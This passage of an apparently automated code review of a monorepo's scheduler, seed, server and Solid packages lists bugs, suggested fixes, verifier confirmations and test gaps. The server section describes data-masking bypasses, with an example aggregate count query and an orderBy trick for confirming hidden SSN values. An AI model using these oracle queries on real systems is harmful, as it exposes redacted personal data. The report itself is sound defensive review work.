- pruneBackups paged R2 listing: the retention test uses a single-page list; the truncated-cursor loop and MAX_PRUNE_PAGES bound (create-worker.ts:2793-2808) are unexercised.
- probeRelayCount cache behavior: relay-tier tests cover fresh-probe routing but not the 5s TTL expiry/re-probe, the fail-closed-to-0 path on a probe throw, or a non-numeric relayCount payload.
- decodeRankPageCursor with a forged/malformed perShard payload (e.g. values that aren't RankPageKey objects) — the unchecked cast at query-coordinator.ts:840 flows straight into args.after / kWayMergeRankPages with no test.

<a id="lunorascheduler"></a>

### @lunora/scheduler

**Assessment:** The package is in good shape overall: the SchedulerDO shows unusually careful failure-mode engineering (claim-before-dispatch, per-record fault isolation, dead-lettering instead of silent drops, SSRF-safe env-only dispatch origin, HMAC-signed dispatches) and the builder/client surfaces are thin and well-validated, with strong test coverage of the retry, dead-letter, and alarm-contract paths. The two findings that deserve prompt attention are both in the workpool concurrency bookkeeping: the alarm pass holds a cached pool row across a non-storage fetch await, letting a concurrent /complete be silently overwritten (a permanent slot leak that degrades pool capacity over time), and stale time-index entries are never garbage-collected, which can lock the DO into a perpetual immediate-alarm loop after a partial storage failure.

#### 1. [HIGH / bug] Alarm-pass pool cache goes stale across the dispatch fetch await, clobbering concurrent /complete and permanently leaking pool slots — **verified: confirmed**

`packages/scheduler/src/scheduler-do.ts:606`

alarm() caches PoolState per pool in `pools` (line 377) for the whole drain pass, but dispatch() awaits an outbound fetch (line 473). Durable Object input gates only close during storage operations, so a `POST /complete` from the runtime can be delivered mid-await and persist a decremented pool row (releaseSlot removes the finished id from inFlightIds). When the drain resumes, reservePoolSlot for the next pooled record reads the STALE cached pool (line 606: `pools.get(record.pool) ?? await this.loadPool(...)`) and savePool()s it back (line 628) — and the failed-kick release path does the same (lines 560–567). Failure scenario: pool max=3 with job A in flight, jobs B and C due. Reserve B → storage ids [A,B]; during B's dispatch await, /complete(A) arrives → storage ids [B]; reserve C from the cached [A,B] → savePool writes [A,B,C]. A is resurrected as in-flight even though it completed and will never /complete again — there is no lease timeout, so one concurrency slot is leaked forever and the pool degrades toward 0 effective capacity under sustained load.

**Suggested fix:** Don't hold PoolState across the dispatch await: re-load the pool row from storage after every dispatch() call (drop the cross-record cache), or restructure slot tracking as one storage key per held slot (`slot:<pool>:<jobId>`) so reserve/release are independent point writes instead of read-modify-write of a single row.

**Verifier note:** CONFIRMED — and the failure is actually more deterministic than the finding claims.

1. The stale-cache mechanics are exactly as described in /home/user/lunora/packages/scheduler/src/scheduler-do.ts. alarm() builds the `pools` Map (line 377) for the entire drain pass; reservePoolSlot prefers the cache over storage (line 606: `pools.get(record.pool) ?? (await this.loadPool(record.pool))`) and savePool()s the mutated cached object back (line 628). Nothing invalidates or re-reads the pool after dispatch()'s fetch await (line 473). The failed-kick release path (lines 560-567) also operates on the cached object. handleComplete (lines 796-820) loads fresh from storage and persists a decremented row — which the next cache-based savePool then clobbers.

2. The claimed race window is real per the DO concurrency model (input gates close only during storage ops, not outbound fetch), but the codebase makes it GUARANTEED, not merely possible: in /home/user/lunora/packages/runtime/src/create-worker.ts, handleSchedulerDispatch runs the job (`await dispatchToShard(...)`, line 1878) and then `await releasePoolSlot(candidate)` (line 1882) — which POSTs /complete back to the same SchedulerDO — BEFORE returning the dispatch HTTP response. So every successful pooled job's /complete is delivered to the DO while alarm()'s dispatch() fetch is still awaiting (if the input gate blocked it, this design would deadlock; it doesn't, because the gate is open during non-storage awaits).

3. Concrete deterministic leak, no pre-existing in-flight job needed: pool max=3, jobs B and C due in one pass. Reserve B → storage+cache {ids:[B]}. During dispatch(B)'s await, /complete(B) persists {ids:[]}. Fetch returns 2xx. Reserve C reads the STALE cache {ids:[B]}, saves {ids:[B,C]} — B resurrected. /complete(C) during C's dispatch removes only C → final durable {ids:[B], inFlight:1}. B completed and will never /complete again (releaseSlot is id-idempotent, so a duplicate wouldn't help anyway — none is coming). The code itself admits there is no lease timeout (comment at lines 992-993: "the lack of a lease timeout is a known limitation"), so the phantom slot is permanent. Phantoms accumulate across drain passes until inFlight >= maxConcurrency, after which requeuePooled re-arms every job forever — the pool stalls at zero effective capacity.

4. Nothing refutes it: the workpool tests (packages/scheduler/**tests**/workpool.test.ts) mock dispatch() to resolve synchronously and only send /complete between alarm passes, so no test exercises a /complete delivered mid-dispatch-await; there is no reconciliation job, and cancel explicitly never touches pool slots.

Severity: high is appropriate. Not attacker-driven, but it is a deterministic correctness/availability bug in normal operation — any alarm pass dispatching 2+ jobs of the same pool leaks a slot, and every workpool degrades toward a permanent total stall with no self-healing path (only manual pool-row surgery would recover it).

#### 2. [MEDIUM / bug] Dangling time-index entries are never cleaned up, producing a permanent immediate-alarm busy loop

`packages/scheduler/src/scheduler-do.ts:365`

alarm() (lines 359–368) reads each due `t:<time>:<id>` entry and silently skips it when the `id:<id>` header is missing — the stale index key is never deleted. rescheduleAlarm() (lines 1109–1123) then takes the lexically-first `t:` entry and setAlarm()s to its (past) timestamp, so the alarm fires again immediately, finds no record, re-arms to the same past time, and loops forever, burning DO duty cycles and billing. A dangling entry is reachable via the partial-failure paths the module explicitly defends against: e.g. recordRetry() throws after putting the updated header (new scheduledFor, line 750) but before putting the new index (line 751); drainRecordGuarded()'s catch then re-claims the index at the OLD record.scheduledFor (line 516), leaving index-time ≠ header-time. On the next fire the claim delete at line 511 uses the header's scheduledFor and misses the real key, and once the job eventually dispatches (header deleted, line 579) the old index entry is orphaned permanently.

**Suggested fix:** In the alarm() due-collection loop, delete the index entry when its `id:` header is missing (`if (!record) await storage.delete(indexKey)`), and/or have rescheduleAlarm() skip-and-delete entries whose header no longer exists.

#### 3. [MEDIUM / bug] crons.interval() compiles to */n step fields, which is not 'every n' for values that don't divide the period

`packages/scheduler/src/jobs.ts:135`

compileInterval renders `{ minutes: n }` as `*/n * * * *` and `{ hours: n }` as `0 */n * * *`. Cron step syntax means 'at field values divisible by n', not a true interval: `{ minutes: 45 }` fires at :00 and :45 of every hour (alternating 45-minute and 15-minute gaps); `{ hours: 7 }` fires at 00:00, 07:00, 14:00, 21:00 then again 00:00 (a 3-hour gap). The builder docs ('Every `{ seconds | minutes | hours }`', line 216) and the Convex-equivalent positioning promise a fixed recurrence, and validation (field(), 1–59 / 1–23) happily accepts every non-divisor value, so users get silently-wrong schedules.

**Suggested fix:** Either validate that the value evenly divides the period (60 for seconds/minutes, 24 for hours) and throw with a clear message otherwise, or document the cron-step semantics explicitly on interval().

#### 4. [LOW / bug] TIME_PAD=15 is one digit too narrow for the accepted scheduledFor range, breaking the index's lexical-order invariant

`packages/scheduler/src/scheduler-do.ts:71`

handleSchedule accepts scheduledFor up to MAX_SCHEDULED_FOR_MS = 8_640_000_000_000_000 (16 digits, line 915; a test at **tests**/scheduler-do.test.ts:869 exercises exactly that max), but padTime zero-pads to only 15 digits. Any scheduledFor >= 1e15 yields a 16-char key while values < 1e15 yield 15-char keys, and lexical comparison then breaks: '1500000000000000' (1.5e15) sorts BEFORE '200000000000000' (2e14), so rescheduleAlarm()'s first-entry read arms the alarm for the chronologically LATER job and the earlier one fires millennia late. Purely theoretical dates (year 5138+), but the code comments at lines 68–71 and 902–910 claim the cap guarantees the padding invariant — it does not.

**Suggested fix:** Set TIME_PAD to 16 (String(MAX_SCHEDULED_FOR_MS).length), or lower the accepted maximum to 1e15 - 1 so every accepted value pads to a uniform width.

#### 5. [LOW / perf] Unbounded full-storage list on every schedule/cancel/fire while a live socket is connected

`packages/scheduler/src/scheduler-do.ts:683`

broadcastChange() → listRecords() runs `storage.list({ prefix: 'id:' })` with no limit and JSON.stringifies the entire pending-job set on EVERY /schedule (line 969), /cancel (line 995), dead-retry (line 1048), and alarm fire (line 397) as soon as one studio WebSocket is connected; handlePoolStatus (line 831) and handleStatus (line 862) do the same unbounded scan per request. With a large durable backlog (the whole point of a workpool absorbing bursts — e.g. tens of thousands of queued jobs), enqueue cost becomes O(backlog) per call, i.e. O(n²) to fill the queue, and each broadcast serializes the full list per socket inside the single-threaded DO.

**Suggested fix:** Cap the live/list payload (e.g. first N by due time via the `t:` index plus a total count), or debounce/coalesce broadcasts, and add a `limit` to the status scans.

#### 6. [LOW / refactor] callDO/getDO/stub-resolution duplicated verbatim between create-scheduler.ts and create-workpool.ts

`packages/scheduler/src/create-workpool.ts:12`

create-workpool.ts lines 6–40 (workpoolStub, callDO, getDO) are a byte-for-byte copy of create-scheduler.ts lines 6–40 (schedulerStub, callDO, getDO): same jurisdiction application, same `https://scheduler.internal` origin, same error shaping into LunoraError INTERNAL with status+text. ~35 duplicated lines that must be kept in sync — a change to the error format or the internal origin in one file will silently drift the other (they already only differ by the options type, and WorkpoolOptions extends LunoraSchedulerOptions so one signature covers both).

**Suggested fix:** Extract a package-internal `do-client.ts` with `schedulerStub(options: LunoraSchedulerOptions)`, `callDO`, and `getDO`, and import it from both factories.

#### 7. [LOW / refactor] retry:<id> rows are write-only — persisted on every retry but never read anywhere

`packages/scheduler/src/scheduler-do.ts:748`

recordRetry() puts the full retry record under `retry:<id>` (line 748) in addition to the authoritative `id:<id>` header (line 750), and the same data is deleted again in drainRecord (line 579), the dead-letter park (line 731), and removeRecord (line 1091). A repo-wide grep confirms no production code in this or any other package ever gets or lists the `retry:` prefix — only tests assert its existence. Every failed dispatch therefore pays an extra storage put, and every cleanup an extra delete key, purely to maintain a duplicate copy of the header.

**Suggested fix:** Drop the `retry:` row (the `attempts` field already lives on the `id:` header, which /list and the studio consume) and update the tests that assert on it; or if it is reserved for a future retry-inspection endpoint, add that consumer or a comment saying so.

#### Missing test coverage

- No test simulates a POST /complete arriving between a pooled job's slot reservation and the end of the alarm drain (the input-gates-open window during dispatch()'s fetch await) — the stale pools-cache clobber in scheduler-do.ts:606/628 is exactly the interleave the suite never exercises.
- No test covers a dangling t:<time>:<id> index entry whose id: header is missing — the expected behavior (clean it up rather than rescheduleAlarm() re-arming to a past time forever) is unspecified and untested.
- releaseFirstSlot (scheduler-do.ts:277) — the legacy id-less POST /complete fallback that can over-release — has zero tests; only the id-carrying path is covered.
- handleComplete for a pool name with no persisted pool: row silently creates a phantom pool:<name> row with maxConcurrency 1 that then appears in GET /status forever — untested behavior.
- broadcastChange after an alarm fire: the live-subscription tests cover pushes on /schedule and /cancel, but not that connected sockets receive the updated list when alarm() dispatches or dead-letters jobs (scheduler-do.ts:396-398).
- POST /dead/retry of a POOLED job — the docstring claims it re-enters the concurrency gate like a fresh enqueue, but no test resurrects a dead job whose record carries a pool and verifies the maxConcurrency gate applies.
- QueueWorkpool.enqueueBatch with an empty jobs array — Cloudflare's sendBatch rejects empty batches, and queue-workpool.ts:65-74 neither guards nor tests this edge.
- compileInterval with values that don't divide the period (e.g. { minutes: 45 }, { hours: 7 }) — cron-jobs.test.ts only exercises divisor values, so the uneven */n firing semantics are never pinned down.

<a id="lunoraseed"></a>

### @lunora/seed

**Assessment:** Overall healthy: a small, well-factored deterministic seeding core with unusually good regression tests (pinned cross-version hash mapping, string/serialized hash-domain collision, indexOffset id-collision, $reset tombstones) and clearly documented limitations (e.g. .unique() non-enforcement is called out in the README, so it was not reported). The security surface is effectively nil for this dev-time package (no SQL/command construction, no network, record parsing in @lunora/values already null-protos against prototype pollution); the findings are edge-case correctness issues, the most notable being ignored record key validators and a concurrency race in the seed client's persist path.

#### 1. [MEDIUM / bug] Record key validator is ignored — keys are always lorem words, which fail schema validation for constrained keys

`packages/seed/src/generate-value.ts:158`

The `record` case generates every key via `copycat.word(["k", itemInput])` and only honours `valueValidator`. But `@lunora/values`' `v.record(keyValidator, valueValidator)` parses EVERY key through `keyInternal._parse` at insert time (packages/values/src/v.ts:646), so a schema like `v.record(v.id("users"), v.boolean())` or a key validator with minLength/format constraints gets seeded rows whose keys are plain lorem words and are rejected by the writer's validation — the seed run fails on insert. Notably, `ValidatorMeta` in packages/seed/src/introspect.ts:21 already declares `keyValidator?: Validator` but no code ever reads it.

**Suggested fix:** In the `record` branch, read `metaOf(inner).keyValidator` and generate the key via `generateValue(keyValidator, fieldName, ["k", itemInput])` (coercing to string), falling back to `copycat.word` only when absent. For `v.id(...)` keys this still can't reference real rows (same limitation as raw `id` columns), but constrained string keys would at least validate.

#### 2. [MEDIUM / bug] Concurrent calls on one seed client race on createdCount/offset across the persist await, producing duplicate _ids

`packages/seed/src/client.ts:155`

`seedTable` reads `const offset = createdCount[table] ?? 0` (line 155) synchronously, but with a `persist` hook the per-plan loop awaits `persist(planned, rows)` (line 183) BEFORE later tables' `createdCount` entries are updated. With a multi-table plan (child + auto-seeded FK parent), `await Promise.all([seed.posts(5), seed.posts(5)])` interleaves at the parent's persist await: both calls read `createdCount.posts === 0`, both generate posts at absolute indices 0–4, and since ids are deterministic hashes of `[seed, table, index, "_id"]`, the two batches produce byte-identical `_id`s — duplicate primary keys that fail (or silently double) at the persist target. The `setHashKey` comment at line 150 shows interleaving was considered, but only for the hash salt, not the offset bookkeeping.

**Suggested fix:** Serialize calls per client with an internal promise chain (`last = last.then(run)` inside `seedTable`), or snapshot/increment `createdCount` before the first await. Serializing is simplest and also keeps `$store` ordering deterministic under Promise.all.

#### 3. [LOW / bug] FK-parent closure traverses through existingIds-covered parents, seeding unrequested grandparent tables

`packages/seed/src/plan.ts:175`

`fkParentClosure` (packages/seed/src/introspect.ts:159) expands roots through ALL parents, and only afterwards does plan.ts:175 filter out tables covered by `existingIds`. With a chain comments→posts→users, `seedPlan(schema, { only: ["comments"], existingIds: { posts: ["p1"] } })` excludes `posts` (covered) but still seeds 10 `users` rows — a table nobody requested and nothing references, since the only consumer of users ids (posts) is not being seeded. Those junk rows are then inserted by every adapter (CLI NDJSON import, testing harness).

**Suggested fix:** Stop the closure traversal at parents already covered by existingIds (pass the covered set into fkParentClosure and don't push their fields' fkTables), instead of post-filtering the full closure.

#### 4. [LOW / bug] Unknown table names in `only` are silently dropped — programmatic callers get an empty plan with no error

`packages/seed/src/plan.ts:168`

A typo'd table in `only` survives into `requested`/`selected` but is filtered out by `orderTables`'s `byName.has(name)` check (packages/seed/src/introspect.ts:133), so `seedPlan` just returns a plan without it. The CLI guards this upstream (`validateSeedTable` in packages/cli/src/commands/seed/handler.ts), but the testing adapter (`seed(harness, schema, { only: ["userz"] })`, packages/seed/src/testing.ts:56) and any direct `seedPlan` caller silently seed nothing — the test author sees `ids.userz === undefined` and a confusing downstream failure instead of a clear "unknown table" error.

**Suggested fix:** Throw a `LunoraError` (the package already depends on @lunora/errors and uses it in generate-value.ts) when an `only` entry names a table absent from the schema, mirroring the CLI's validateSeedTable message.

#### 5. [LOW / bug] number path lacks the impossible-constraint guard the string path has — minimum > maximum surfaces as a raw faker error

`packages/seed/src/generate-value.ts:146`

`generateString` explicitly throws a contextual LunoraError when `minLength > maxLength` (lines 61–66), but the `number` case passes `constraints.maximum`/`constraints.minimum` straight into `faker.number.int` (line 146). A schema with `minimum: 100, maximum: 10` (user error) makes faker throw its own 'Max ... should be greater than min ...' error with no table/field attribution, unlike every other seed constraint failure. Same asymmetry: non-integer bounds (e.g. minimum: 0.5 on v.number()) also hit faker's integer-only validation.

**Suggested fix:** Mirror the string guard: validate minimum <= maximum up front and throw the same field-attributed LunoraError; consider copycat.float when the bounds are non-integers since v.number() is a float column anyway.

#### 6. [LOW / refactor] $reset's justifying comment documents an invariant seedPlan no longer has

`packages/seed/src/client.ts:193`

The comment (lines 193–197) and three eslint-disable justifications claim 'seedPlan treats key _presence_ (not array length) as "this parent table is already covered"', so keys must be deleted rather than emptied. That is no longer true: plan.ts:175 checks `(existingIds[table] ?? []).length === 0`, and plan.test.ts:138 pins exactly that length-based semantics as a regression ('empty array must not be treated as covered'). The delete-based reset still works, but the comment asserts a false invariant — a future maintainer 'restoring' presence semantics in seedPlan to match this documentation would reintroduce the tombstone bug the tests guard against.

**Suggested fix:** Rewrite the comment to state the current length-based contract (or simplify $reset to plain reassignment-free clearing now that empty arrays are harmless), keeping the client.test.ts:197 regression test as the behavioural pin.

#### Missing test coverage

- v.record(...) columns are never seeded in any test — the record branch of generateValue (key generation, valueValidator recursion, keyValidator handling) is entirely unexercised (generate-value.ts:155-165).
- Server-default columns: no test schema uses .default()/.$defaultFn(), so hasServerDefault detection (introspect.ts:59-69) and the skip-so-the-server-fills-it path (plan.ts:150) are untested.
- Optional FK fallback: only the nullable self-FK → null path is tested (plan.test.ts:154); v.optional(v.id(...)) with an empty pool returning undefined (field omitted, plan.ts:93-94) has no test.
- Required-FK placeholder fallback: the cross-table-cycle test (plan.test.ts:182) asserts only termination and row counts, never that the cycle-broken table's required FK gets the documented placeholder uuid (plan.ts:98).
- bigint/bytes end-to-end through the testing adapter: reviveRow (testing.ts:30-54) is never driven via seed()+harness insert — testing.test.ts uses a strings-only schema, so the BigInt/ArrayBuffer coercion against the real DO writer validation is untested.
- setHashKey with a Uint32Array key: the word-folding branch (hash.ts:136-143) is untested — copycat.test.ts:159 covers only the string and 0 forms.
- Union of non-literal members: plan.test.ts:21 only uses a union of literals; the generateValue union branch that picks a member validator and recurses with [input, "u"] (generate-value.ts:175-180) has no direct test.
- Concurrent client usage: no test issues Promise.all-ed calls on one client with a persist hook, so the createdCount/offset race (client.ts:155) is unpinned either way.

<a id="lunoraserver"></a>

### @lunora/server

**Assessment:** The package is generally well-engineered with extensive defense-in-depth around RLS, masking, secrets redaction, and header/response safety, and the security-critical seams (IDOR scoping via expectedTable, secure-by-default guard recovery, fail-closed count/rank) are carefully handled. The most notable issue is a gap in Dynamic Data Masking: the middleware closes value-oracle vectors on row reads (where/withIndex/withSearchIndex) but leaves the analytical and ordering paths (aggregate/groupBy where-filters, count baseWhere, findMany orderBy) unguarded, so a masked column value can still be probed.

#### 1. [HIGH / security] Masking bypass: aggregate/groupBy where-filters are unguarded value oracles — **verified: confirmed**

`packages/server/src/mask/middleware.ts:502`

The mask middleware carefully closes masked-column value oracles on findMany/findFirst/count/query via assertWhereAllowed, and on the index path via assertIndexFieldsAllowed. But `aggregate` (line 502) and `groupBy` (line 559) only call assertReductionAllowed, which checks the _reduced_ column (options.field / options.by) and NOT the `where`/`baseWhere` FILTER. The caller's full options object (which the typed facade TableAggregateOptions/RestrictableQueryOptions exposes with `where` and `baseWhere`) is forwarded verbatim to base.aggregate/base.groupBy, and @lunora/do's aggregate merges that filter into the SQL predicate (ctx-db.ts ~2085). So a caller can probe a masked column: `ctx.db.<maskedTable>.aggregate({ op: "count", where: { ssn: { eq: "123-45-6789" } } })` returns 1 when an RLS-visible row with that SSN exists and 0 otherwise — a direct value-confirmation oracle that defeats the mask. groupBy is the same. This is exactly the oracle the assertWhereAllowed comment (lines 472-497) says the middleware exists to prevent, but on a path it doesn't cover.

**Suggested fix:** Run assertWhereAllowed(tableName, options.where, "aggregate"/"groupBy") (and reject a masked column in baseWhere/order too) before delegating, mirroring the findMany/count guards.

**Verifier note:** Confirmed real. In packages/server/src/mask/middleware.ts the aggregate (502) and groupBy (559) handlers call only assertReductionAllowed, which inspects options.field / options.by, and forward the full options (including caller-supplied where/baseWhere) verbatim to base.aggregate / base.groupBy. Neither invokes assertWhereAllowed on options.where. The where is caller-controllable and part of the typed surface: TableAggregateOptions/TableGroupByOptions extend RestrictableQueryOptions which exposes where, and the facade (facade.ts:245,279) forwards options verbatim. In @lunora/do ctx-db.ts, aggregate op:"count" delegates to writer.count with the where (2065-2073) and non-count merges where into the SQL predicate (2085, 2117-2124), so a masked-column where leaks row presence/existence: aggregate({op:"count", where:{ssn:{eq:guess}}}) returns 1 vs 0, and groupBy/non-count aggregates filter identically — a direct value-confirmation oracle over a masked column. The sibling paths (count line 508, findMany/findFirst, and the index path via assertIndexFieldsAllowed) DO guard the caller where against masked columns, and the assertWhereAllowed comment (472-497) states this exact oracle is what the middleware exists to prevent, confirming aggregate/groupBy are the uncovered paths. No upstream validator, type constraint, or test closes the scenario: the regression suite (mask.test.ts 505-560) covers findMany/count/index oracles but has no aggregate/groupBy where test, and the aggregate pass-through test (484-495) uses no where. Severity high is appropriate: it is an exploitable, externally reachable confidentiality bypass of the masking control enabling exact-value confirmation/binary-search of redacted columns.

#### 2. [MEDIUM / security] Masking bypass: count baseWhere and findMany/findFirst orderBy are unguarded

`packages/server/src/mask/middleware.ts:508`

Two more masked-column oracles the middleware misses. (1) count() (line 508) unwraps only `wrapper.where` and explicitly skips `baseWhere` ('server-trusted'), but the public count options type (RestrictableQueryOptionsOf) lets a _caller_ set baseWhere, and @lunora/do count merges countOptions.baseWhere into the effective predicate (ctx-db.ts:2172). So `count({ baseWhere: { ssn: { eq: guess } } })` is an existence oracle that skips assertWhereAllowed. (2) findMany/findFirst pass `args.orderBy` straight through (lines 521-546); sorting a masked table by a masked column (`findMany({ orderBy: [{ ssn: "asc" }] })`) returns cells masked but rows ordered by the true hidden value, a sort oracle that lets a caller binary-search/relatively rank the hidden values across pages.

**Suggested fix:** Check baseWhere in count's guard, and reject (or refuse to honor) an orderBy referencing a masked column in findMany/findFirst.

#### 3. [LOW / bug] Presence data-size cap measured in UTF-16 code units, not bytes

`packages/server/src/presence.ts:227`

MAX_DATA_BYTES is documented and named as a 4096-BYTE cap on the awareness blob (to bound storage/subscriber-delta amplification), but the check is `JSON.stringify(args.data).length > MAX_DATA_BYTES`. String .length counts UTF-16 code units, so a payload of multibyte characters (emoji, CJK, etc.) can carry up to ~2-4x MAX_DATA_BYTES actual bytes before being rejected, weakening the amplification bound the check exists to enforce.

**Suggested fix:** Measure bytes with `new TextEncoder().encode(JSON.stringify(args.data)).length` (or rename the constant to reflect code-units).

#### Missing test coverage

- No test exercises the masking value-oracle vectors: aggregate/groupBy with a masked-column `where` filter, count() with a caller-supplied `baseWhere` naming a masked column, and findMany/findFirst `orderBy` on a masked column — the guarded where/withIndex/withSearchIndex paths are tested but these bypasses are not.
- presence heartbeat `data` size limit has no boundary test with multibyte UTF-8 content to distinguish the byte-vs-code-unit measurement.
- defineEnv accessor: no test for object spread `{...config(env)}` / Object.keys enumeration, which routes through the proxy's ownKeys+getOwnPropertyDescriptor and eagerly validates every declared key (can throw LunoraEnvError for keys the caller never intended to read), contradicting the documented per-key laziness that destructuring relies on.
- redactSecrets: no test that a secret longer than the validator's 80-char `received` truncation is still redacted (redactValueForKey's replaceAll(raw,...) can't match the truncated form; only the high-entropy fallback would).

<a id="lunorasolid"></a>

### @lunora/solid

**Assessment:** The adapter is a thin, mostly well-factored layer over the shared @lunora/client cores, with no security-relevant surface (browser-side glue, no external input handling; the Math.random session-id fallback is explicitly non-credential). The main problems are that its hand-rolled paginated core has drifted behind the Vue reference copy it cites — missing the result-migration-on-rebalance fix and result-map pruning — and that the auth gate components conflate "user still resolving" with "resolved to null", which can wedge an app in AuthLoading forever.

#### 1. [MEDIUM / bug] Rebalance (split/join) drops all loaded results and regresses status to LoadingFirstPage — **verified: confirmed**

`packages/solid/src/create-paginated-query.ts:156`

When `rebalance` returns a new page list (SPLIT when a page outgrows 2x numItems, JOIN when it shrinks below 0.5x), the new pages have new subscription keys, but nothing migrates the existing entries in `resultsByKey` to those keys. `setPages(next)` triggers the pages effect, `syncSubscriptions` closes the old subs and opens pending new ones, and `rebuildPageResults` maps the new keys to `undefined`. Failure scenario: a live feed where page 0 grows past the split threshold — every already-rendered item vanishes until the new subscriptions' first server frames arrive, and because `pageResults()[0]` is now `undefined`, `derivePaginationStatus` returns "LoadingFirstPage", so `isLoading()` flips back to true on a fully-loaded feed. The Vue adapter fixed exactly this with `migrateResultsForRebalance` (packages/vue/src/use-paginated-core.ts:88-111), called right before `pages.value = next`; the Solid core (whose comments explicitly cite Vue's policy) never received the fix.

**Suggested fix:** Port Vue's `migrateResultsForRebalance` (donor lookup by matching `lower` bound, seeding new keys from old results before `setPages(next)`), or better, hoist the whole engine per the reuse finding so the fix exists once.

**Verifier note:** Confirmed by reading the code. In packages/solid/src/create-paginated-query.ts:155-161 the rebalance branch calls setPages(next) with no migration of resultsByKey to the new page keys. Page keys embed cursor/endCursor/numItems, and a SPLIT (packages/client/src/pagination/index.ts:95-102) produces two pages with novel keys (JOIN likewise produces a novel merged key), so the pages effect's syncSubscriptions closes the old sub and rebuildPageResults maps the new keys to undefined until the new subscriptions' first server frames arrive. When the affected page is index 0, derivePaginationStatus returns LoadingFirstPage on !pageResults[0] (pagination/index.ts:134), so isLoading() flips back to true on a fully-loaded feed. The Vue core has exactly the missing fix (migrateResultsForRebalance, packages/vue/src/use-paginated-core.ts:88-111, called before pages.value = next); the Solid core, whose comments cite Vue's pendingPageKeys policy, never received it. No guard prevents the path: pendingPageKeys only delays rebalance until all pages resolve, and the Solid tests deliberately size pages so rebalance thresholds are never crossed (test file comment, lines 15-21), so nothing pins this behavior. Two caveats reduce severity from high to medium: (1) rebalance skips open-ended pages, so the initial single page can never split — at least one loadMore must have pinned page 0 first, and (2) only the rebalanced page's items vanish (other pages keep their keys/results), and data self-heals after one server round-trip — a transient UI regression (content flash + spurious whole-feed loading state via isLoading), not data loss or corruption.

#### 2. [MEDIUM / bug] Auth gates hang in AuthLoading forever when the token resolves to no user

`packages/solid/src/create-auth.tsx:71`

`AuthLoading` renders children while `token() !== null && user() === null`, and `Authenticated` requires `user() !== null`. But the shared identity store has no 'settled' state: `getCurrentUser()` rejecting sets user to `null` permanently (packages/client/src/auth/index.ts, `refresh()`'s `.catch`), and a token that resolves to no user does the same. Failure scenario: an expired JWT restored from storage at startup — `getCurrentUser` rejects, `user` stays `null`, so `AuthLoading` renders its spinner forever, `Unauthenticated` never renders (token is non-null), and the user can never reach the sign-in screen. The React adapter avoids this by tracking `isLoading` separately from the resolved user (packages/react/src/auth-gates.tsx uses `useAuthState().isLoading`); the Solid gates infer loading from `user === null`, which is not equivalent.

**Suggested fix:** Track a settled/loading flag (mirror React's auth-state) instead of inferring loading from `user() === null`; treat a rejected/empty identity resolve with a token present as unauthenticated, not loading.

#### 3. [MEDIUM / bug] Overlapping mutate() calls can settle out of order and clobber data()/error() with stale outcomes

`packages/solid/src/create-mutation.ts:10`

The handle documents `data` as "the latest invocation's resolved value" and `error` as "the latest invocation's error", and pending is explicitly ref-counted for overlapping calls. But the shared `createMutationRunner` (packages/client/src/mutation-runner.ts) writes `setResult`/`setError` unconditionally with no invocation token, unlike `createMutatorRunner` in the same package, which added a monotonic `latestInvocation` guard specifically to fix this race for `createMutator`. Failure scenario: call mutate(A) (slow), then mutate(B) (fast, succeeds) — `data()` shows B's result, then A settles: if A succeeds, `data()` reverts to A's stale result; if A fails, `error()` reports a failure for a state the UI already saved successfully (and `setResult`'s `setError(undefined)` never runs to clear it). Affects createMutation in every adapter, but the fix belongs in the shared runner.

**Suggested fix:** Add the same latest-invocation token guard `createMutatorRunner` already uses to `createMutationRunner` before writing setResult/setError.

#### 4. [MEDIUM / reuse] ~250-line paginated-core engine is triplicated across solid/vue/svelte and has already diverged

`packages/solid/src/create-paginated-query.ts:70`

`createPaginatedCore` (lines 70-260) duplicates packages/vue/src/use-paginated-core.ts and packages/svelte/src/paginated-query.ts nearly line-for-line: identical `buildPageArgs`/`buildPageKey`, `pendingPageKeys` rebalance suppression, subscription sync, and loadMore tail-carry logic; only the reactive glue (signal vs ref vs store) differs. The divergence is not hypothetical — the two pagination bugs above (missing rebalance migration, missing resultsByKey pruning) are fixes that landed in the Vue copy and never reached Solid (or Svelte). The repo already has the exact precedent for this shape: `createQuerySubscription` (packages/client/src/query/query-subscription.ts) and `createMutationRunner`/`createMutatorRunner` were hoisted into @lunora/client with framework-supplied sinks, and @lunora/client/pagination already hosts the pure cursor math. Additionally, `buildPageKey` (line 60) uses raw `JSON.stringify` for the identity key while the repo's canonical encoder is `stableStringify` from shared/stable-key.ts — which this very package already imports in create-flag.ts:5 — so two equal-but-key-order-differing args objects produce distinct page keys and duplicate subscriptions.

**Suggested fix:** Hoist the subscription-managing engine (page keys, sub map, pending set, loadMore carry, rebalance migration) into @lunora/client/pagination with onPageResults/onPages sinks, and key pages with the shared stableStringify.

#### 5. [LOW / bug] resultsByKey is never pruned when stale subscriptions close — unbounded growth over a feed's lifetime

`packages/solid/src/create-paginated-query.ts:117`

The stale-close loop in `syncSubscriptions` deletes from `activeSubs` and `pendingPageKeys` but not from `resultsByKey`; only a base-args change or dispose (`teardownAll`) clears it. Each `loadMore` and each rebalance strands the old keys' entries, and every entry retains a full page array of items. Failure scenario: a long-lived infinite feed (chat, activity log) that the user scrolls through for a session accumulates one orphaned full-page result per loadMore/rebalance, never reclaimed. A stranded entry can also be served as stale data if a later JOIN recreates a previously-seen `{lower, upper: null}` key. Vue's core deletes the entry on close (`resultsByKey.delete(entry.currentKey)`, packages/vue/src/use-paginated-core.ts:125). Relatedly, the comment at line 236 ("The subscription closure key is also updated in activeSubs so the callback writes to the right slot") describes Vue's re-keying implementation — the Solid code does not re-key; it closes and reopens — so the comment is actively misleading for maintenance.

**Suggested fix:** Delete the closed key from `resultsByKey` in the stale-close loop (after the loadMore carry has copied it), and fix or drop the stale re-keying comment at line 236.

#### 6. [LOW / bug] createSubscription's error accessor discards the SubscriptionError code

`packages/solid/src/create-subscription.ts:48`

`onError` rewraps the incoming `SubscriptionError` as `new Error(subscriptionError.message)`, dropping the optional `code` field the client's wire type carries (packages/client/src/subscription.ts:7-10). Failure scenario: an app cannot distinguish an auth-expired subscription rejection from a not-found one via `error()` to decide whether to re-authenticate or hide the view — only the human-readable message survives.

**Suggested fix:** Preserve the code (e.g. attach it to the Error, or surface a LunoraError from @lunora/errors, already a dependency of this package).

#### Missing test coverage

- createPaginatedQuery split/join rebalance re-keying: no test drives a SPLIT (page > 2x numItems with splitCursor) or JOIN and asserts results/status survive the page-list change — the exact path where the missing result-migration bug lives (existing 'BUG 2 regression' test only covers the pending-page suppression guard).
